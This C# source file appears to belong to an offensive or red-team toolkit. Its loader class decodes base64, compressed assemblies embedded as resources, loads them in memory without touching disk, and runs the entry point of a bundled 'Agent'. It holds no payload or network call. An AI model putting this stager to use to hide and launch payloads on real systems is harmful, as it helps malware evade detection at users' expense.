using Aegis.Models.Interfaces;
using System.IO;
using System.Reflection;
using System.Reflection.PortableExecutable;
using System.Runtime.Loader;

namespace Aegis.Loader
{
    public class AgentLoader : ILoader
    {
        public async Task Go()
        {
            await Load();
        }
        public async Task Load()
        {
            List<string> excludedDlls = new List<string>() { "Agent.b64", "Agent.Models.b64" };
            var alc = AssemblyLoadContext.Default;
            var asmExe = Assembly.GetExecutingAssembly();
            if (asmExe == null)
            {
                return;
            }

            List<string> sources = asmExe.GetManifestResourceNames().ToList();

            //Gotta load this one first since all the others basically rely on it

            string modelString = GetEmbeddedResourceAsString(sources.Find(item => item.Contains("Agent.Models.b64")));

            if (string.IsNullOrEmpty(modelString))
            {
                return;
            }

            byte[] decodedBytes = Convert.FromBase64String(modelString);
            alc.LoadFromStream(new MemoryStream(decodedBytes));

            //Load the rest of the DLLs except for the agent
            foreach (string aa in sources)
            {
                if (excludedDlls.Contains(aa))
                {
                    continue;
                }
                string s = GetEmbeddedResourceAsString(aa);
                //Stream s = asmExe.GetManifestResourceStream(aa);
                if (!string.IsNullOrEmpty(s))
                {
                    decodedBytes = Convert.FromBase64String(s);
                    alc.LoadFromStream(new MemoryStream(decodedBytes));
                }
            }
            // Get the entry point method
            string ad = GetEmbeddedResourceAsString(sources.Find(item => item.Contains("Agent.b64")));

            if (string.IsNullOrEmpty(ad))
            {
                return;
            }
            decodedBytes = Convert.FromBase64String(ad);
            Assembly agent = alc.LoadFromStream(new MemoryStream(decodedBytes));

            MethodInfo entryPoint = agent.EntryPoint;

            // Invoke the entry point method
            object[] parameters = new object[] { new string[0] }; // You can pass command-line arguments
            entryPoint.Invoke(null, parameters);
        }
        private string GetEmbeddedResourceAsString(string resourceName)
        {
            var assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            {
                if(stream is null)
                {
                    return string.Empty;
                }

                Stream dcStream = new MemoryStream();
                FileDecompressor.DecompressStream(stream, dcStream);
                using (StreamReader reader = new StreamReader(dcStream))
                {
                    return reader.ReadToEnd();
                }

            }
        }
        /// <summary>
        /// Base64 decode a string and return it as a byte array
        /// </summary>
        /// <param name="base64EncodedData">String to decode</param>
        private static byte[] Base64DecodeToByteArray(string base64EncodedData)
        {
            return Convert.FromBase64String(base64EncodedData);
        }
    }
}
